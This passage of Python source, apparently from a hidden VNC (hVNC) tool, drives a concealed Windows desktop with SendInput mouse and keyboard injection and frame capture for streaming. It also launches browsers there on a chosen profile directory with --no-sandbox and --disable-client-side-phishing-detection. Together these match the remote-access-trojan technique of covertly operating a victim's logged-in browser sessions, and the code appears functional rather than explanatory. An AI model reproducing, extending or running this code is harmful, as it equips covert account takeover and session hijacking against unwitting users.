        inp.union.mi.dy = abs_y
        inp.union.mi.mouseData = data
        inp.union.mi.dwFlags = flags | MOUSEEVENTF_ABSOLUTE
        inp.union.mi.time = 0
        inp.union.mi.dwExtraInfo = 0  # NULL pointer
        
        user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))
    
    def _send_keyboard_input(self, vk_code: int, scan_code: int = 0, flags: int = 0) -> None:
        """Send keyboard input using SendInput."""
        inp = INPUT()
        inp.type = INPUT_KEYBOARD
        inp.union.ki.wVk = vk_code
        inp.union.ki.wScan = scan_code
        inp.union.ki.dwFlags = flags
        inp.union.ki.time = 0
        inp.union.ki.dwExtraInfo = 0  # NULL pointer
        
        user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))
    
    def mouse_move(self, x: int, y: int) -> None:
        """Queue mouse move command."""
        self._queue.put(("mouse_move", x, y))
    
    def mouse_down(self, x: int, y: int, button: str = "left") -> None:
        """Queue mouse down command."""
        self._queue.put(("mouse_down", x, y, button))
    
    def mouse_up(self, x: int, y: int, button: str = "left") -> None:
        """Queue mouse up command."""
        self._queue.put(("mouse_up", x, y, button))
    
    def mouse_click(self, x: int, y: int, button: str = "left") -> None:
        """Queue mouse click command."""
        self._queue.put(("mouse_click", x, y, button))
    
    def mouse_scroll(self, x: int, y: int, delta_x: int, delta_y: int) -> None:
        """Queue mouse scroll command."""
        self._queue.put(("mouse_scroll", x, y, delta_x, delta_y))
    
    def key_down(self, vk_code: int, scan_code: int = 0) -> None:
        """Queue key down command."""
        self._queue.put(("key_down", vk_code, scan_code))
    
    def key_up(self, vk_code: int, scan_code: int = 0) -> None:
        """Queue key up command."""
        self._queue.put(("key_up", vk_code, scan_code))
    
    def type_char(self, char: str) -> None:
        """Queue character input."""
        self._queue.put(("type_char", char))
    
    def type_text(self, text: str) -> None:
        """Queue text input."""
        self._queue.put(("type_text", text))
    
    def _execute_input(self, cmd: tuple) -> None:
        """Execute a single input command."""
        action = cmd[0]
        
        if action == "mouse_move":
            _, x, y = cmd
            self._send_mouse_input(MOUSEEVENTF_MOVE, x, y)
            
        elif action == "mouse_down":
            _, x, y, button = cmd
            self._send_mouse_input(MOUSEEVENTF_MOVE, x, y)
            if button == "left":
                self._send_mouse_input(MOUSEEVENTF_LEFTDOWN, x, y)
            elif button == "right":
                self._send_mouse_input(MOUSEEVENTF_RIGHTDOWN, x, y)
            elif button == "middle":
                self._send_mouse_input(MOUSEEVENTF_MIDDLEDOWN, x, y)
                
        elif action == "mouse_up":
            _, x, y, button = cmd
            if button == "left":
                self._send_mouse_input(MOUSEEVENTF_LEFTUP, x, y)
            elif button == "right":
                self._send_mouse_input(MOUSEEVENTF_RIGHTUP, x, y)
            elif button == "middle":
                self._send_mouse_input(MOUSEEVENTF_MIDDLEUP, x, y)
                
        elif action == "mouse_click":
            _, x, y, button = cmd
            self._send_mouse_input(MOUSEEVENTF_MOVE, x, y)
            if button == "left":
                self._send_mouse_input(MOUSEEVENTF_LEFTDOWN, x, y)
                time.sleep(0.02)
                self._send_mouse_input(MOUSEEVENTF_LEFTUP, x, y)
            elif button == "right":
                self._send_mouse_input(MOUSEEVENTF_RIGHTDOWN, x, y)
                time.sleep(0.02)
                self._send_mouse_input(MOUSEEVENTF_RIGHTUP, x, y)
            elif button == "middle":
                self._send_mouse_input(MOUSEEVENTF_MIDDLEDOWN, x, y)
                time.sleep(0.02)
                self._send_mouse_input(MOUSEEVENTF_MIDDLEUP, x, y)
                
        elif action == "mouse_scroll":
            _, x, y, delta_x, delta_y = cmd
            self._send_mouse_input(MOUSEEVENTF_MOVE, x, y)
            if delta_y != 0:
                self._send_mouse_input(MOUSEEVENTF_WHEEL, x, y, delta_y * 120)
            if delta_x != 0:
                self._send_mouse_input(MOUSEEVENTF_HWHEEL, x, y, delta_x * 120)
                
        elif action == "key_down":
            _, vk_code, scan_code = cmd
            flags = 0
            if vk_code in (0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x2D, 0x2E):
                flags |= KEYEVENTF_EXTENDEDKEY
            self._send_keyboard_input(vk_code, scan_code, flags)
            
        elif action == "key_up":
            _, vk_code, scan_code = cmd
            flags = KEYEVENTF_KEYUP
            if vk_code in (0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x2D, 0x2E):
                flags |= KEYEVENTF_EXTENDEDKEY
            self._send_keyboard_input(vk_code, scan_code, flags)
            
        elif action == "type_char":
            _, char = cmd
            if char:
                inp = INPUT()
                inp.type = INPUT_KEYBOARD
                inp.union.ki.wVk = 0
                inp.union.ki.wScan = ord(char)
                inp.union.ki.dwFlags = KEYEVENTF_UNICODE
                inp.union.ki.time = 0
                inp.union.ki.dwExtraInfo = 0  # NULL pointer
                user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))
                inp.union.ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP
                user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))
                
        elif action == "type_text":
            _, text = cmd
            for char in text:
                self._execute_input(("type_char", char))
                time.sleep(0.01)
    
    def _input_loop(self) -> None:
        """Main input processing loop - runs entirely on hidden desktop."""
        logger.info("Input thread starting...")
        
        # Switch this thread to hidden desktop PERMANENTLY
        if not self._desktop.switch_to():
            logger.error("Failed to switch input thread to hidden desktop!")
            self._initialized.set()
            return
        
        logger.info("Input thread switched to hidden desktop: %s", self._desktop.name)
        self._initialized.set()
        
        while not self._stop_event.is_set():
            try:
                cmd = self._queue.get(timeout=0.1)
            except queue.Empty:
                continue
            
            try:
                self._execute_input(cmd)
            except Exception as exc:
                logger.debug("Input error: %s", exc)
        
        logger.info("Input loop stopped")
    
    def close(self) -> None:
        """Stop input controller."""
        self._stop_event.set()
        if self._input_thread.is_alive():
            self._input_thread.join(timeout=2.0)


class HVNCSession:
    """Complete hVNC session managing desktop, capture, and input.
    
    This is the main entry point for using hVNC functionality.
    
    Usage:
        session = HVNCSession()
        session.start_shell()  # Start explorer.exe
        session.launch_browser("chrome", "https://example.com")
        
        # Get frames for streaming
        frame, size = session.get_frame()
        
        # Send input
        session.mouse_click(100, 200)
        session.type_text("Hello")
        
        session.close()
    """
    
    def __init__(
        self,
        width: int = 1920,
        height: int = 1080,
        fps: int = 30,
        desktop_name: str | None = None,
        auto_start_shell: bool = False,
    ):
        """Create hVNC session.
        
        Args:
            width: Screen capture width
            height: Screen capture height
            fps: Target framerate
            desktop_name: Custom desktop name (auto-generated if None)
            auto_start_shell: If True, start shell before capture
        """
        self._width = width
        self._height = height
        self._fps = fps
        
        # Create hidden desktop
        self._desktop = HiddenDesktop(name=desktop_name)
        
        # Create capture with delayed start - we'll start after shell is ready
        self._capture = HiddenDesktopCapture(
            self._desktop,
            width=width,
            height=height,
            fps=fps,
            delay_start=True,  # Don't start capture yet
        )
        
        # Create input controller
        self._input = HiddenDesktopInput(
            self._desktop,
            screen_size=(width, height),
        )
        
        logger.info("hVNC session created: %dx%d @ %d fps", width, height, fps)
    
    @property
    def desktop(self) -> HiddenDesktop:
        """Get the hidden desktop."""
        return self._desktop
    
    @property
    def width(self) -> int:
        return self._width
    
    @property
    def height(self) -> int:
        return self._height
    
    @property
    def frame_size(self) -> tuple[int, int]:
        return self._capture.frame_size
    
    def start_shell(self) -> bool:
        """Start Windows shell (explorer.exe) on hidden desktop and begin capture.
        
        Note: This starts capture immediately to allow WebRTC connection to establish.
        The capture thread will retry until desktop is ready, returning black frames initially.
        """
        result = self._desktop.start_shell()
        if result:
            # Start capture immediately - don't block WebRTC connection establishment
            # Capture thread will retry until desktop is ready
            # This allows ICE to complete while desktop initializes in parallel
            self._capture.start_capture()
            logger.info("Shell started and capture initialized")
        return result
    
    def launch_application(
        self,
        executable: str,
        args: list[str] | None = None,
        working_dir: str | None = None,
    ) -> subprocess.Popen | None:
        """Launch an application on the hidden desktop."""
        return self._desktop.launch_application(
            executable,
            args=args,
            working_dir=working_dir,
        )
    
    def launch_browser(
        self,
        browser: str,
        url: str | None = None,
        extra_args: list[str] | None = None,
        profile_path: str | None = None,
    ) -> subprocess.Popen | None:
        """Launch a browser on the hidden desktop.
        
        Args:
            browser: Browser name (chrome, firefox, edge)
            url: URL to open
            extra_args: Additional command line arguments
            profile_path: Path to browser profile directory (for --user-data-dir)
        """
        # Resolve browser path
        browser_paths = {
            "chrome": [
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "Application", "chrome.exe"),
            ],
            "firefox": [
                r"C:\Program Files\Mozilla Firefox\firefox.exe",
                r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
            ],
            "edge": [
                r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
                os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
            ],
            "brave": [
                r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
                r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
                os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
            ],
        }
        
        browser_lower = browser.lower()
        paths = browser_paths.get(browser_lower, [browser])
        
        exe_path = None
        for path in paths:
            if os.path.exists(path):
                exe_path = path
                break
        
        if not exe_path:
            logger.error("Browser not found: %s", browser)
            return None
        
        # Build args
        args = list(extra_args) if extra_args else []
        
        # Add browser-specific flags
        if browser_lower in ("chrome", "edge", "brave"):
            args.extend([
                "--no-sandbox",
                "--disable-gpu",
                "--disable-software-rasterizer",
                "--no-first-run",
                "--no-default-browser-check",
                "--disable-background-networking",
                "--disable-client-side-phishing-detection",
                "--disable-sync",
            ])
            
            # Add profile path if provided
            if profile_path and os.path.isdir(profile_path):
                args.append(f"--user-data-dir={profile_path}")
                logger.info("Using custom profile path: %s", profile_path)
        
        elif browser_lower == "firefox":
            # Firefox uses -profile flag
            if profile_path and os.path.isdir(profile_path):
                args.extend(["-profile", profile_path])
                logger.info("Using custom Firefox profile: %s", profile_path)
        
        if url:
            args.append(url)
        
        logger.info("Launching %s with args: %s", browser, args[:5])  # Log first 5 args
        return self.launch_application(exe_path, args=args)
    
    def get_frame(self, timeout: float = 0.5) -> tuple[bytes | None, tuple[int, int]]:
        """Get the latest captured frame.
        
        Returns:
            Tuple of (frame_data, (width, height))
            Frame data is BGRA format.
        """
        return self._capture.get_frame(timeout=timeout)
    
    def get_windows(self) -> list[WindowInfo]:
        """Get list of windows on hidden desktop."""
        return self._desktop.enumerate_windows()
    
    def set_fps(self, fps: int) -> None:
        """Set capture framerate."""
        self._capture.set_fps(fps)
    
    # Input methods
    def mouse_move(self, x: int, y: int) -> None:
        """Move mouse to position."""
        self._input.mouse_move(x, y)
    
    def mouse_down(self, x: int, y: int, button: str = "left") -> None:
        """Press mouse button."""
        self._input.mouse_down(x, y, button)
    
    def mouse_up(self, x: int, y: int, button: str = "left") -> None:
        """Release mouse button."""
        self._input.mouse_up(x, y, button)
    
    def mouse_click(self, x: int, y: int, button: str = "left") -> None:
        """Click at position."""
        self._input.mouse_click(x, y, button)
    
    def mouse_scroll(self, x: int, y: int, delta_x: int = 0, delta_y: int = 0) -> None:
        """Scroll at position."""
        self._input.mouse_scroll(x, y, delta_x, delta_y)
    
    def key_down(self, vk_code: int, scan_code: int = 0) -> None:
        """Press a key."""
        self._input.key_down(vk_code, scan_code)
    
    def key_up(self, vk_code: int, scan_code: int = 0) -> None:
        """Release a key."""
        self._input.key_up(vk_code, scan_code)
    
    def type_char(self, char: str) -> None:
        """Type a single character."""
        self._input.type_char(char)
    
    def type_text(self, text: str) -> None:
        """Type text string."""
        self._input.type_text(text)
    
    def close(self) -> None:
        """Close the hVNC session and cleanup."""
        self._input.close()
        self._capture.close()
        self._desktop.close()
        logger.info("hVNC session closed")


# Convenience function
def create_hvnc_session(
    width: int = 1920,
    height: int = 1080,
    fps: int = 30,
    start_shell: bool = True,
) -> HVNCSession:
    """Create and initialize an hVNC session.
    
    Args:
        width: Capture width
        height: Capture height
        fps: Target framerate
        start_shell: Start explorer.exe automatically
    
    Returns:
        Initialized HVNCSession
    """
    session = HVNCSession(width=width, height=height, fps=fps)
    if start_shell:
        session.start_shell()
    return session
